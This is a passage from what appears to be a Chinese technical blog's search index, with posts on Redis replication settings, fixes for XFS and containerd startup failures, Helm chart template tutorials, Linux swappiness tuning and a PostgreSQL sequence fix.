是否使用socket方式复制数据。目前redis复制提供两种方式，disk和socket。如果新的slave连上来或者重连的slave无法增量同步，就会执行全量同步，master会生成rdb文件。有2种方式： disk方式是master创建一个新的进程把rdb文件保存到磁盘，再把磁盘上的rdb文件传递给slave。 socket是master创建一个新的进程，直接将RDB通过网络发送给slave，不使用磁盘作为中间存储。 disk方式的时候，rdb是作为一个文件保存在磁盘上，因此多个slave都能共享这个rdb文件。 socket方式的复制（无盘复制）是基于顺序的串行复制（master会等待一个repl-diskless-sync-delay的秒数，如果没slave来注册话，就直接传，后来的slave得排队等待。已注册的就可以一起传）。在磁盘速度缓慢，网速快的情况下推荐用socket方式。 repl-diskless-sync-delay 5 无磁盘复制的延迟时间，不要设置为0。因为一旦复制开始，master节点不会再接收新slave的复制请求，直到这个rdb传输完毕。所以最好等待一段时间，等更多的slave注册上到master后一起传输，提供同步性能。 repl-ping-slave-period 10 slave根据指定的时间间隔向服务器发送ping请求。默认10秒。 repl-timeout 60 复制连接超时时间。master和slave都有超时时间的设置。master检测到slave上次发送的时间超过repl-timeout，即认为slave离线，清除该slave信息。slave检测到上次和master交互的时间超过repl-timeout，则认为master离线。需要注意的是repl-timeout需要设置一个比repl-ping-slave-period更大的值，不然会经常检测到超时。 repl-backlog-size 5mb 复制缓冲区大小，这是一个环形复制缓冲区，用来保存最新复制的命令。这样在slave离线的时候，不需要完全复制master的数据，如果可以执行部分同步，只需要把缓冲区的部分数据复制给slave，就能恢复正常复制状态。缓冲区的大小越大，slave离线的时间可以更长，复制缓冲区只有在有slave连接的时候才分配内存。没有slave的一段时间，内存会被释放出来，默认1m。 repl-backlog-ttl 3600 master释放缓冲区内存的时间，单位为秒。 ","date":"2020-06-24 15:31","objectID":"/post/1845/:0:0","tags":["redis"],"title":"redis主从复制和配置","uri":"/post/1845/"},{"categories":["其他","基础内容"],"content":"generating “/run/initramfs/rdsosreport.txt” entering emergencymode. exit the shell to continue type “journalctl” to view system logs. you might want to save “/run/initramfs/rdsosreport.txt” to a usb stick or /boot after mounting them and attach it to a bug report。 解决方法： xfs_repair /dev/mapper/centos-root -L ","date":"2020-06-24 14:05","objectID":"/post/1842/:0:0","tags":[],"title":"断电导致generating rdsosreport.txt系统无法启动","uri":"/post/1842/"},{"categories":["docker"],"content":"原文链接：http://zhangguanzhang.github.io/2020/01/08/docker-panic-invalid-page-type/ 报错信息大致如下： panic: pgid (68719476737) above high water mark (183) goroutine 1 [running]: github.com/containerd/containerd/vendor/github.com/boltdb/bolt.(*node).spill(0xc4203fb420, 0xc4202b1198, 0x2) /go/src/github.com/containerd/containerd/vendor/github.com/boltdb/bolt/node.go:375 +0x679 github.com/containerd/containerd/vendor/github.com/boltdb/bolt.(*Bucket).spill(0xc4200bc398, 0xb1378c, 0x5597f073a780) /go/src/github.com/containerd/containerd/vendor/github.com/boltdb/bolt/bucket.go:570 +0x4ba github.com/containerd/containerd/vendor/github.com/boltdb/bolt.(*Tx).Commit(0xc4200bc380, 0x0, 0x0) /go/src/github.com/containerd/containerd/vendor/github.com/boltdb/bolt/tx.go:163 +0x121 github.com/containerd/containerd/vendor/github.com/boltdb/bolt.(*DB).Update(0xc4201c70e0, 0xc4202b1540, 0x0, 0x0) /go/src/github.com/containerd/containerd/vendor/github.com/boltdb/bolt/db.go:605 +0xea github.com/containerd/containerd/metadata.(*DB).Init(0xc4203fe840, 0x5597f0044b40, 0xc42003e0a0, 0xc4202b1660, 0xc4203fe840) /go/src/github.com/containerd/containerd/metadata/db.go:103 +0xb1 github.com/containerd/containerd/server.LoadPlugins.func2(0xc4203fb340, 0xc420221bc0, 0x21, 0xc4204114e0, 0x1e) /go/src/github.com/containerd/containerd/server/server.go:255 +0x53f github.com/containerd/containerd/plugin.(*Registration).Init(0xc420404a50, 0xc4203fb340, 0xc420404a50) /go/src/github.com/containerd/containerd/plugin/plugin.go:98 +0x3a github.com/containerd/containerd/server.New(0x7fd80d330158, 0xc42003e0a0, 0xc4203d8b40, 0x1, 0xc4202b1c80, 0x5597eed907cd) /go/src/github.com/containerd/containerd/server/server.go:106 +0x600 github.com/containerd/containerd/cmd/containerd/command.App.func1(0xc4203de2c0, 0xc4203de2c0, 0xc4202b1d07) /go/src/github.com/containerd/containerd/cmd/containerd/command/main.go:132 +0x5fb github.com/containerd/containerd/vendor/github.com/urfave/cli.HandleAction(0x5597efe31760, 0x5597f0021718, 0xc4203de2c0, 0xc4203fe3c0, 0x0) /go/src/github.com/containerd/containerd/vendor/github.com/urfave/cli/app.go:502 +0xca github.com/containerd/containerd/vendor/github.com/urfave/cli.(*App).Run(0xc4201a7180, 0xc42003a090, 0x3, 0x3, 0x0, 0x0) /go/src/github.com/containerd/containerd/vendor/github.com/urfave/cli/app.go:268 +0x60e main.main() github.com/containerd/containerd/cmd/containerd/main.go:28 +0x51 ERRO[2020-06-24T13:49:28.209961851+08:00] containerd did not exit successfully error=\"exit status 2\" module=libcontainerd 删除此文件 /data/docker/containerd/daemon/io.containerd.metadata.v1.bolt ","date":"2020-06-24 13:57","objectID":"/post/1841/:0:0","tags":["docker"],"title":"文件系统损坏导致docker启动失败","uri":"/post/1841/"},{"categories":["kubernetes"],"content":"Helm提供了一种hook机制，以允许chart开发人员在release的生命周期的某些时间进行干预。例如，您可以使用hook执行以下操作： 在加载任何其他chart之前，在安装期间加载ConfigMap或Secret。 在安装新chart之前，执行作业备份数据库，然后在升级后,执行第二个作业还原数据。 在删除release之前，在删除release之前适当地停止其他服务。 hook使用注解来定义，例如： apiVersion: ... kind: .... metadata: annotations: \"helm.sh/hook\": \"pre-install\" # ... ","date":"2020-06-23 18:25","objectID":"/post/1839/:0:0","tags":["k8s","helm"],"title":"helm模板开发-hooks(七)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"可用的hooks pre-install: 在渲染模板之后,在Kubernetes中创建任何资源之前执行。 post-install: 将所有资源加载到Kubernetes之后执行 pre-delete: 在从Kubernetes删除任何资源之前执行 post-delete: 删除所有release资源后执行 pre-upgrade: 在渲染模板之后，但在任何资源加载到Kubernetes之前执行 post-upgrade: 升级所有资源后执行 pre-rollback: 在模板渲染后，回滚之前执行 post-rollback: 回滚之后执行 crd-install: 在运行任何其他检查之前添加CRD资源。这仅在chart中其他清单所使用的CRD定义上使用。 test-success: 在运行helm test,Pod返回成功(返回码==0)执行 test-failure: 在运行helm test,Pod返回失败(返回码!=0)执行 ","date":"2020-06-23 18:25","objectID":"/post/1839/:1:0","tags":["k8s","helm"],"title":"helm模板开发-hooks(七)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"hook的生命周期 hooks使chart开发人员 有机会在release生命周期的关键时刻执行特定的操作。 例如，helm install的生命周期。默认情况下，生命周期如下： 运行helm install foo chart加载到tiller中 经过验证后，tiller渲染foo模板 tiller将产生的资源加载到Kubernetes中 titler返回release名称和一些其他数据给helm客户端 helm客户端退出 Helm为install生命周期定义了两个hooks：pre-install和post-install。如果foo chart的开发人员使用了这两个hook，那么生命周期的更改如下： 运行helm install foo chart加载到tiller中 经过验证后，tiller渲染foo模板 tiller准备执行pre-install(将hook资源加载到Kubernetes中) tiller按权重对hook进行排序(默认情况下权重为0),并按名称对具有相同权重的hook按升序排序。 tiller加载最小权重的hook tiller等待hook准备好为止(CRD资源除外) tiller将产生的资源加载到Kubernetes中。注意:如果设置了–wait参数，Tiller将等待所有资源处于就绪状态，并且在它们就绪之前不会运行post-install挂钩。 tiller执行post-install(将hook资源加载到Kubernetes中) tiller等待hook准备好为止 titler返回release名称和一些其他数据给helm客户端 helm客户端退出 上面提到的tiller等待hook准备好为止是什么意思？ 这取决于hook中声明的资源。如果资源是一个job类型，tiller就会等待job成功运行，如果job失败了，这个release失败，这是一个阻塞操作，因此Helm客户端将在运行job时暂停。 对于所有其他类型的资源，只要Kubernetes将资源标记为已加载（添加或更新），资源就被视为“就绪”。 当在一个hook中声明许多资源时，这些资源将被串行执行。如果它们有hook权重(见下文)，则按权重顺序执行。否则，不能保证执行顺序。（在Helm 2.3.0和之后的版本中，它们是按字母顺序排序的。) 添加hook权重被认为是一个好的实践，如果权重不重要，则将其设置为0。 ","date":"2020-06-23 18:25","objectID":"/post/1839/:2:0","tags":["k8s","helm"],"title":"helm模板开发-hooks(七)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"hooks资源是不受版本管理的 hooks创建的资源不会作为release的一部分进行跟踪或管理。一旦Tiller确认hook已达到就绪状态，就不会在管这个hook资源了 实际上，这意味着如果在hook中创建资源，就不能依赖helm delete来删除资源。要销毁这些资源，您需要在pre-delete或post-deletehook中编写执行此操作的代码，或者添加\"helm.sh/hook-delete-policy\"注解到hook模板文件。 ##编写一个hook hook只是Kubernetes清单文件，在metadata部分有特殊注解。因为它们是模板文件，所以可以使用所有常规模板功能，包括读取.Values、.Release和.Template。 比如，这个模板文件在templates/post-install-job.yaml,声明了hook post-install，要运行一个job。 apiVersion: batch/v1 kind: Job metadata: name: \"{{.Release.Name}}\" labels: app.kubernetes.io/managed-by: {{.Release.Service | quote }} app.kubernetes.io/instance: {{.Release.Name | quote }} helm.sh/chart: \"{{.Chart.Name}}-{{.Chart.Version}}\" annotations: # 如果没有下面的注解，这个job将作为release的一部分 \"helm.sh/hook\": post-install \"helm.sh/hook-weight\": \"-5\" \"helm.sh/hook-delete-policy\": hook-succeeded spec: template: metadata: name: \"{{.Release.Name}}\" labels: app.kubernetes.io/managed-by: {{.Release.Service | quote }} app.kubernetes.io/instance: {{.Release.Name | quote }} helm.sh/chart: \"{{.Chart.Name}}-{{.Chart.Version}}\" spec: restartPolicy: Never containers: - name: post-install-job image: \"alpine:3.3\" command: [\"/bin/sleep\",\"{{default \"10\" .Values.sleepyTime}}\"] 使此模板成为hook的注解： annotations: \"helm.sh/hook\": post-install 一个资源可以实现多个hook，例如: annotations: \"helm.sh/hook\": post-install,post-upgrade 当subcharts声明hook时，也会执行。顶级chart无法禁用subcharts声明的hook。 可以为hook定义一个权重，这将有助于确定执行顺序。使用以下注解定义权重： annotations: \"helm.sh/hook-weight\": \"5\" ","date":"2020-06-23 18:25","objectID":"/post/1839/:3:0","tags":["k8s","helm"],"title":"helm模板开发-hooks(七)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"hook的权重可以是正数或负数，但必须表示为字符串。优先执行权重小的hook 我们还可以定义何时删除相应hook资源的策略。hook删除策略使用以下注解定义： annotations: \"helm.sh/hook-delete-policy\": hook-succeeded 可选的注解值： \"hook-succeeded\": 在hook执行成功后，tiller删除对应的hook资源。 \"hook-failed\": 在hook执行失败后，tiller删除对应的hook资源。 \"before-hook-creation\": 在启动新hook之前，tiller删除上一次执行后hook资源。 helm.sh/hook-delete-timeout注解。该值是tiller应等待hook完全删除的秒数。值为0表示tiller不等待。默认情况下，Tiller将等待60秒。 ","date":"2020-06-23 18:25","objectID":"/post/1839/:4:0","tags":["k8s","helm"],"title":"helm模板开发-hooks(七)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"自动从以前的版本删除hook 当release被更新时，hook资源可能已经存在于集群中。在这种情况下，helm会抛出\"... already exists\"错误。 hook资源已经存在的一个常见原因是，在以前的install/upgrade中使用hook资源后，没有将其删除。事实上，有充分的理由可以解释为什么人们想要保留hook：例如，需要手动调试，以防出错。在这种情况下，为了确保后续创建的hook不会失败的建议方法是定义一个\"hook-delete-policy\"，该策略可以处理：\"helm.sh/hook-delete-policy\": \"before-hook-creation\"。此hook注解会导致在安装新hook之前移除任何现有hook。 ","date":"2020-06-23 18:25","objectID":"/post/1839/:5:0","tags":["k8s","helm"],"title":"helm模板开发-hooks(七)","uri":"/post/1839/"},{"categories":["基础内容"],"content":"|： 代表每一行的末尾都会添加一个换行符\\n |-：和|一样，但是最后一行不添加换行符\\n \u003e： 只在最后一行添加换行符\\n ","date":"2020-06-23 18:07","objectID":"/post/1838/:0:0","tags":["yaml"],"title":"yaml中|、|-、\u0026gt;的区别","uri":"/post/1838/"},{"categories":["kubernetes"],"content":"NOTES.txt 在执行helm install或helm upgrade，Helm可以为用户打印一些有用的信息。NOTES.txt可以使用对象,函数等来高度自定义说明信息。 编写NOTES.txt Thank you for installing {{ .Chart.Name }}. Your release is named {{ .Release.Name }}. To learn more about the release, try: $ helm status {{ .Release.Name }} $ helm get {{ .Release.Name }} 安装后提示如下信息： 99305-m4pda07k1po.png ","date":"2020-06-23 16:31","objectID":"/post/1836/:1:0","tags":["k8s","helm"],"title":"helm模板开发-NOTES.txt文件和子chart(六)","uri":"/post/1836/"},{"categories":["kubernetes"],"content":"子chart 首先创建一个demo1，然后在创建一个subchart helm create demo1 cd demo1/charts helm create subchart 修改子chart中的values.yaml和configmap.yaml #values.yaml dessert: sub #configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-sub-cm data: dessert: {{ .Values.dessert }} 修改父chart中的values.yaml和configmap.yaml #values.yaml dessert: parent #configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-parent-cm data: dessert: {{ .Values.dessert }} 渲染后的结果： --- # Source: demo1/charts/subchart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: dining-lion-sub-cm data: dessert: sub --- # Source: demo1/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: dining-lion-parent-cm data: dessert: parent 父chart和子chart的values设置互不影响，我们在父chart的values.yaml中添加一些值可以覆盖子chart的值 dessert: parent subchart: dessert: parent1 再次渲染后，可以发现子chart的值被覆盖了 --- # Source: demo1/charts/subchart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: alliterating-olm-sub-cm data: dessert: parent1 ####全局值 Values数据类型具有一个名为Values.global的保留部分，可以在其中设置全局值。 我们修改父chart中的values.yaml global: g: \"my is global\" #父chart configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-parent-cm data: dessert: {{ .Values.global.g }} #子chart configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name}}-sub-cm data: dessert: {{ .Values.global.g }} 渲染后的结果： --- # Source: demo1/charts/subchart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: reeling-seagull-sub-cm data: dessert: my is global --- # Source: demo1/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: reeling-seagull-parent-cm data: dessert: my is global ","date":"2020-06-23 16:31","objectID":"/post/1836/:2:0","tags":["k8s","helm"],"title":"helm模板开发-NOTES.txt文件和子chart(六)","uri":"/post/1836/"},{"categories":["kubernetes"],"content":"官方文档：https://v2.helm.sh/docs/chart_template_guide/#glob-patterns Helm提供了通过.Files对象访问文件。但是，在开始使用模板示例之前，需要注意一些有关其工作原理的事情： 可以在Helm chart中添加其他文件。这些文件将被捆绑并发送到Tiller。不过要小心。由于Kubernetes对象的存储限制，图表必须小于1M。 .Files通常出于安全原因，某些文件无法通过.Files对象访问。 无法访问templates/中的文件。 无法访问被.helmignore排除的文件。 ","date":"2020-06-23 15:24","objectID":"/post/1834/:0:0","tags":["k8s","helm"],"title":"helm模板开发-访问文件(五)","uri":"/post/1834/"},{"categories":["kubernetes"],"content":"基本示例： 首先创建三个文件 #config1.toml message = \"Hello from config 1\" #config2.toml message = \"This is config 2\" #config3.toml message = \"Goodbye from config 3\" 我们使用range函数来遍历这些文件 apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: {{- $files := .Files }} {{- range list \"config1.toml\" \"config2.toml\" \"config3.toml\" }} {{ . }}: |- {{ $files.Get . }} {{- end }} 渲染后的效果： # Source: files-demo/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: app: eerie-hydra data: config1.toml: |- message = \"Hello from config 1\" config2.toml: |- message = \"This is config 2\" config3.toml: |- message = \"Goodbye from config 3\" ","date":"2020-06-23 15:24","objectID":"/post/1834/:1:0","tags":["k8s","helm"],"title":"helm模板开发-访问文件(五)","uri":"/post/1834/"},{"categories":["kubernetes"],"content":"glob模式 Files.Glob(pattern string)方法返回所有匹配的文件路径列表，可协助您以全局模式灵活性提取某些文件。 简单示例： 目录结构 bar ├── bar.conf ├── bar.go └── bar.yaml foo ├── foo.txt └── foo.yaml apiVersion: v1 kind: ConfigMap metadata: name: glob-test data: {{- $root := . }} {{- range $path,$bytes := .Files.Glob \"**.yaml\" }} {{ base $path }}: |- {{ $root.Files.Get $path }} {{- end -}} 渲染后的效果： --- # Source: files-demo/templates/configmap2.yaml apiVersion: v1 kind: ConfigMap metadata: name: glob-test data: bar.yaml: |- my is bar.yaml foo.yaml: |- my is foo.yaml ","date":"2020-06-23 15:24","objectID":"/post/1834/:2:0","tags":["k8s","helm"],"title":"helm模板开发-访问文件(五)","uri":"/post/1834/"},{"categories":["kubernetes"],"content":"命名模板时要记住的重要细节：模板名称是全局的。如果您声明两个具有相同名称的模板，则以最后加载的那个为准。由于子chart中的模板是与顶级模板一起编译的，因此应谨慎使用图表特定名称来命名模板。 一种流行的命名约定是在每个定义的模板前添加chart名称：{{ define \"mychart.labels\" }}。通过使用特定的chart名称作为前缀，我们可以避免由于两个不同的chart,使用了相同的模板名称而引起的任何冲突。 ","date":"2020-06-23 13:24","objectID":"/post/1828/:0:0","tags":["k8s","helm"],"title":"helm模板开发-命名模板(四)","uri":"/post/1828/"},{"categories":["kubernetes"],"content":"1.使用define声明和使用模板 define操作使我们可以在模板文件内部创建命名模板。它的语法如下： {{ define \"MY.NAME\" }} # body of template here {{ end }} 例如，我们可以定义一个模板来封装Kubernetes标签块： {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} {{- end }} 现在，我们可以将此模板嵌入到现有的ConfigMap中，然后将其包含在template中： {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} {{- end }} apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap {{- template \"mychart.labels\" }} data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} 渲染后的结果如下： # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: toned-greyhound-configmap labels: generator: helm date: 2020-06-23 data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza 通常命名模板会放置在_helpers.tpl文件中。我们把该命名模板移到那里： vim templates/_helpers.tpl {{/* 生成基本标签 */}} {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} {{- end }} 渲染后的效果： --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: factual-seagull-configmap labels: generator: helm date: 2020-06-23 data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza ","date":"2020-06-23 13:24","objectID":"/post/1828/:1:0","tags":["k8s","helm"],"title":"helm模板开发-命名模板(四)","uri":"/post/1828/"},{"categories":["kubernetes"],"content":"2.设置模板作用域 在上面定义的模板中，我们没有使用任何对象。我们只是使用了函数。如果在命名模板中使用对象会是什么结果呢： {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} chart: {{ .Chart.Name }} version: {{ .Chart.Version }} {{- end }} 我们渲染后的结果： # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: moldy-jaguar-configmap labels: generator: helm date: 2016-11-02 chart: version: 可以发现这并不是我们所期待的结果,因为.Chart.Name、.Chart.Version不在我们定义的模板作用域内。define呈现命名模板时，它将接收template调用时传递的作用域。在我们的示例中，我们这样调用的模板： {{- template \"mychart.labels\" }} 没有传入任何作用域，因此在模板内我们无法访问.中的任何内容。不过，这很容易解决。我们只需将作用域传递给模板就可以了： {{- template \"mychart.labels\" . }} 此时我们的三个文件内容分别为： # configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap {{- template \"mychart.labels\" . }} data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} #values.yaml name: soulchild livenessProbe: null favorite: drink: coffee food: pizza pizzaToppings: - mushrooms - cheese - peppers - onions #_helpers.tpl {{/* 生成基本标签 */}} {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} chart: {{ .Chart.Name }} version: {{ .Chart.Version }} {{- end }} 修改后我们再次渲染： --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: kind-chipmunk-configmap labels: generator: helm date: 2020-06-23 chart: mychart version: 0.1.0 data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza ##3.include函数 假设我们定义了一个命名模板： {{- define \"mychart.app\" }} app_name: {{ .Chart.Name }} app_version: \"{{ .Chart.Version }}+{{ .Release.Time.Seconds }}\" {{- end -}} configmap.yaml如下 apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap labels: {{- template \"mychart.app\" . }} data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} 查看渲染后的结果： # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: womping-swan-configmap labels: app_name: mychart app_version: \"0.1.0+1592893332\" data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza 可以看到渲染后的label缩进是有问题的，因为template的数据只是插入到上一个文本的右边。上一个文本的最右边是换行符，就相当于是在换行符后面插入文本。 我们可以通过管道和indent来解决缩进问题，但是template是一个’动作’而不是’函数’，不能使用管道。所以无法将template调用的输出传递给其他函数，但是我们可以通过include来做到这一点，例如： apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap labels: {{- include \"mychart.app\" . | indent 4 }} data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} 渲染后的结果： --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: lumbering-alligator-configmap labels: app_name: mychart app_version: \"0.1.0+1592895037\" data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza nindent和indent的区别：nindent会在缩进前多出一个换行符 ","date":"2020-06-23 13:24","objectID":"/post/1828/:2:0","tags":["k8s","helm"],"title":"helm模板开发-命名模板(四)","uri":"/post/1828/"},{"categories":["其他","基础内容"],"content":"swappiness的数值决定如何使用swap。 swappiness=0表示尽量使用物理内存，然后在使用swap空间 swappiness＝100表示尽量使用swap分区 1.查看当前swappiness值 cat /proc/sys/vm/swappiness 2.修改swappiness的值 vim /etc/sysctl.conf vm.swappiness=30 3.使配置生效 sysctl -p ","date":"2020-06-22 09:15","objectID":"/post/1825/:0:0","tags":["linux"],"title":"调整swap分区使用优先级","uri":"/post/1825/"},{"categories":["databases"],"content":" SELECT setval('t_app_app_id_seq',MAX(id),true) FROM 表名； ","date":"2020-06-19 16:56","objectID":"/post/1816/:0:0","tags":["postgresql","pgsql"],"title":"pgsql自增序列-主键冲突问题","uri":"/post/1816/"},{"categories":["kubernetes"],"content":"运算符 eq，ne，lt，gt，and，or，not 流程控制 if/else 条件 with 控制作用域 range，循环 ","date":"2020-06-18 18:21","objectID":"/post/1806/:0:0","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"1.if 条件语句的基本结构如下所示： {{ if PIPELINE }} # Do something {{ else if OTHER PIPELINE }} # Do something else {{ else }} # Default case {{ end }} 如果值为以下内容，则将评估为false： 布尔值false 数字零 一个空字符串 一个nil（empty 或 null） 一个空的集合（map，slice，tuple，dict，array） 在任何其他情况下，条件被计算为true。 示例 ./values.yaml name: soulchild favorite: drink: coffee food: pizza templates/configmap.yaml条件要求.Values.favorite.drink的值等于coffee，则输出mug: true apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | default \"tea\" | quote }} food: {{ .Values.favorite.food | upper | quote }} {{ if eq .Values.favorite.drink \"coffee\" }}mug: true{{ end }} 结果 --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: singing-squid-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true ","date":"2020-06-18 18:21","objectID":"/post/1806/:1:0","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"控制空行 看一下下面的例子 apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | default \"tea\" | quote }} food: {{ .Values.favorite.food | upper | quote }} {{if eq .Values.favorite.drink \"coffee\"}} mug: true {{end}} 结果 # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: killjoy-cow-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true 可以看到mug上面多了一个空行。 请注意，我们在YAML中收到一些空行。为什么？模板引擎运行时，它会删除{{中的内容}}，但会完全保留其余空白。 首先，可以使用特殊字符修改模板声明的花括号语法，以告诉模板引擎压缩空白。{{-（左边加上破折号和空格）表示应该在左边砍掉空白，-}}右边加上破折号代表在右边砍掉空白。换行符是空格！ 解决空行问题： apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | default \"tea\" | quote }} food: {{ .Values.favorite.food | upper | quote }} {{- if eq .Values.favorite.drink \"coffee\" }} mug: true {{- end }} ","date":"2020-06-18 18:21","objectID":"/post/1806/:2:0","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"2.with with可以让您将当前范围（.）设置为特定对象。例如，我们一直在与.Values.favorites。让我们重写ConfigMap，将.范围更改为指向.Values.favorites： apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- end }} 使用{{- with .Values.favorite }} {{- end }}后，with区块内的当前作用域就是.Values.favorite 所以当我们再使用.drink时，就代表是.Values.favorite.drink ","date":"2020-06-18 18:21","objectID":"/post/1806/:3:0","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"3.range helm中使用range来进行循环的工作 首先在values.yaml添加要用到的值 favorite: drink: coffee food: pizza pizzaToppings: - mushrooms - cheese - peppers - onions templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- end }} toppings: |- {{- range .Values.pizzaToppings }} - {{ . | title | quote }} {{- end }} 该range函数将遍历pizzaToppings列表。每次通过循环，.的值都会发生改变，即 第一次.为mushrooms。将第二个迭代为cheese，依此类推。 我们可以.直接沿管道发送值，所以当我们这样做时{{ . | title | quote }}，它先发送.到title（标题大小写函数），然后发送到quote。如果运行此模板，则输出为： # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: edgy-dragonfly-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" toppings: |- - \"Mushrooms\" - \"Cheese\" - \"Peppers\" - \"Onions\" ","date":"2020-06-18 18:21","objectID":"/post/1806/:4:0","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"4.变量 ","date":"2020-06-18 18:21","objectID":"/post/1806/:5:0","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"定义和调用一个变量 apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- $relname := .Release.Name -}} {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} release: {{ $relname }} {{- end }} ","date":"2020-06-18 18:21","objectID":"/post/1806/:5:1","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"range遍历对象 apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} 渲染后的结果 # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: right-gibbon-configmap data: myvalue: \"Hello World\" 